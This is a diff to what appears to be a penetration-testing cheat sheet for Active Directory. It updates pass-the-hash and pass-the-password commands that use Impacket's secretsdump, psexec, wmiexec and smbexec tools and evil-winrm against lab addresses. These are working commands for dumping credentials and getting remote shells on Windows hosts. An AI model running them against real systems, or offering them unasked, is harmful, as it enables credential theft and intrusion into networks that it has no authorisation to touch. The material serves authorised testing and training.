@@ -287,7 +287,7 @@ secretsdump.py test.local\fcastle:Password1@<TARGET_IP>
 ```
 ### Pass the Hash using secretsdump.py
 ```sh
-secretsdump.py administrator@<TARGET_IP> --hashes [LM-HASH]:[NT-HASH]
+secretsdump.py administrator@<TARGET_IP> --hashes [NT-HASH]
 ```
 ### Pass the Password using Metasploit
 ```sh
@@ -308,22 +308,27 @@ psexec.py test.local/fcastle:'Password1'@10.10.10.1
 psexec.py fcastle:'Password1'@10.10.10.1
 
 #pass the hash for local users
-psexec.py Administrator@10.10.10.1 --hashes [LM-hash]:[NTLM-hash]
+psexec.py Administrator@10.10.10.1 -hashes [NTLM-hash]
 ```
 
 ### Wmiexec
 ```sh
-wmiexec.py Administrator@10.10.10.1 --hashes [LM-hash]:[NTLM-hash]
+wmiexec.py Administrator@10.10.10.1 -hashes [NTLM-hash]
 ```
 
 ### SMBExec
 ```sh
 smbexec.py test.local/fcastle:'Password1'@10.10.10.1
+
+smbexec.py test.local/fcastle@10.10.10.1 -hashes [NTLM-hash]
 ```
 
 ### Evil-WinRM
 ```sh
-evil-winrm -i 10.10.10.1 -u fcastle -H [LM-hash]:[NTLM-hash]
+evil-winrm -i 10.10.10.1 -u fcastle -p 'Password1'
+
+
+evil-winrm -i 10.10.10.1 -u fcastle -H [NTLM-hash]
 ```
 
 ---
